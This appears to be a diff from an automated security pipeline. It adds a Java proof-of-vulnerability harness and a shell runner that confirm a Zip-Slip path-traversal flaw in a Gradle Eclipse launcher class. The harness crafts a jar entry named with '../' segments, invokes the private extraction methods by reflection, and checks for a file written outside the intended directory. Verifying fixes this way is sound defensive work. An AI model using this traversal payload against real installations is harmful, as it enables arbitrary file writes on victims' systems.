@@ -1,0 +1,147 @@
+diff --git a/.security-pipeline/pov/ZipSlipPov.java b/.security-pipeline/pov/ZipSlipPov.java
+new file mode 100644
+index 0000000..f6caf5b
+--- /dev/null
++++ b/.security-pipeline/pov/ZipSlipPov.java
+@@ -0,0 +1,110 @@
++package povsec;
++
++import java.io.File;
++import java.io.FileOutputStream;
++import java.io.OutputStream;
++import java.lang.reflect.Constructor;
++import java.lang.reflect.Method;
++import java.nio.file.Files;
++import java.util.zip.ZipEntry;
++import java.util.zip.ZipOutputStream;
++
++import com.diffplug.gradle.eclipserunner.launcher.Main;
++
++/**
++ * Proof-of-Vulnerability for CWE-022 (Path Traversal / Zip-Slip) in
++ * com.diffplug.gradle.eclipserunner.launcher.Main.
++ *
++ * The vulnerable flow (finder trace):
++ *   getLibraryFromFragment(String)  -> reads a ZipEntry name that starts with
++ *   "eclipse_" (line 535) and passes it verbatim as the `jarEntry` argument to
++ *   extractFromJAR(jarPath, jarEntry) (line 545). Inside extractFromJAR the
++ *   attacker-controlled entry name is used to build the output path with
++ *       splash = new File(splash, jarEntry);   (line 2295)
++ *   and the zip content is then written there with Files.copy(...) (line 2320)
++ *   WITHOUT validating that the resolved path stays inside the configuration
++ *   area. A crafted entry name containing "../" therefore escapes the intended
++ *   directory and writes an arbitrary file on disk (Zip-Slip).
++ *
++ * This harness drives the REAL project code (via reflection because the two
++ * methods are private) with a malicious jar and checks whether a file was
++ * written OUTSIDE the configured extraction directory.
++ *
++ * Exit code:
++ *   0  -> traversal succeeded, file escaped the config area (VULNERABLE)
++ *   1  -> traversal blocked, no escaped file created (PATCHED / SAFE)
++ */
++public class ZipSlipPov {
++
++	public static void main(String[] args) throws Exception {
++		File work = Files.createTempDirectory("zipslip-pov").toFile();
++
++		// Intended, "safe" extraction root that the launcher is supposed to
++		// confine writes to.
++		File configArea = new File(work, "configArea");
++		configArea.mkdirs();
++
++		// The location the attacker wants to reach: a sibling of configArea,
++		// i.e. clearly OUTSIDE of it.
++		File escapedFile = new File(work, "ESCAPED/pwned.txt");
++		// Sanity: make sure it does not exist yet.
++		if (escapedFile.exists()) {
++			escapedFile.delete();
++		}
++
++		// Malicious jar entry name. It starts with "eclipse_" so that
++		// getLibraryFromFragment selects it (line 534), and then uses "../"
++		// segments to climb out of  configArea/<plugin>/<cache>/  into the
++		// parent of configArea.
++		//   configArea / org.eclipse.equinox.launcher / <cache> / eclipse_
++		//     ../  -> drop "eclipse_"
++		//     ../  -> drop "<cache>"
++		//     ../  -> drop "org.eclipse.equinox.launcher"
++		//     ../  -> drop "configArea"   (now at `work`)
++		//   ESCAPED/pwned.txt
++		String maliciousEntry = "eclipse_/../../../../ESCAPED/pwned.txt";
++		String payload = "OWNED-BY-ZIP-SLIP";
++
++		// Build the malicious jar/zip.
++		File maliciousJar = new File(work, "fragment.jar");
++		try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(maliciousJar))) {
++			ZipEntry e = new ZipEntry(maliciousEntry);
++			zos.putNextEntry(e);
++			zos.write(payload.getBytes("UTF-8"));
++			zos.closeEntry();
++		}
++
++		// Point the launcher's extraction root at our safe config area.
++		System.setProperty("osgi.configuration.area", "file:" + configArea.getAbsolutePath());
++
++		// Instantiate the real Main and invoke the real (private) vulnerable
++		// method with the malicious fragment jar.
++		Constructor<Main> ctor = Main.class.getDeclaredConstructor();
++		ctor.setAccessible(true);
++		Main main = ctor.newInstance();
++
++		Method getLib = Main.class.getDeclaredMethod("getLibraryFromFragment", String.class);
++		getLib.setAccessible(true);
++		Object result = getLib.invoke(main, maliciousJar.getAbsolutePath());
++
++		System.out.println("[pov] extractFromJAR result = " + result);
++		System.out.println("[pov] configArea          = " + configArea.getCanonicalPath());
++		System.out.println("[pov] escaped target      = " + escapedFile.getCanonicalPath());
++
++		boolean escaped = escapedFile.exists();
++		boolean outsideConfig = !escapedFile.getCanonicalPath()
++				.startsWith(configArea.getCanonicalPath() + File.separator);
++
++		if (escaped && outsideConfig) {
++			String content = new String(Files.readAllBytes(escapedFile.toPath()), "UTF-8");
++			System.out.println("[pov] escaped file content = " + content);
++			if (payload.equals(content)) {
++				System.out.println("VULNERABLE: zip entry escaped the config area via path traversal.");
++				System.exit(0);
++			}
++		}
++
++		System.out.println("SAFE: no file was written outside the config area (traversal blocked).");
++		System.exit(1);
++	}
++}
+diff --git a/.security-pipeline/pov/run_pov.sh b/.security-pipeline/pov/run_pov.sh
+new file mode 100644
+index 0000000..79cbd6f
+--- /dev/null
++++ b/.security-pipeline/pov/run_pov.sh
+@@ -0,0 +1,25 @@
++#!/usr/bin/env bash
++# CWE-022 Zip-Slip / path traversal PoV runner.
++# Compiles the real vulnerable launcher classes plus the PoV harness, then runs
++# the harness against the REAL project code.
++#   exit 0 -> vulnerable (file escaped the config area)
++#   exit non-zero -> patched / safe
++set -euo pipefail
++
++REPO="$(cd "$(dirname "$0")/../.." && pwd)"
++cd "$REPO"
++
++OUT="$(mktemp -d)"
++LAUNCHER_SRC="src/main/java/com/diffplug/gradle/eclipserunner/launcher"
++
++# 1) Compile the real vulnerable product classes (only JDK dependencies).
++javac -d "$OUT" \
++  "$LAUNCHER_SRC/Main.java" \
++  "$LAUNCHER_SRC/JNIBridge.java" \
++  "$LAUNCHER_SRC/Constants.java"
++
++# 2) Compile the PoV harness against those classes.
++javac -cp "$OUT" -d "$OUT" ".security-pipeline/pov/ZipSlipPov.java"
++
++# 3) Run the PoV.
++java -cp "$OUT" povsec.ZipSlipPov
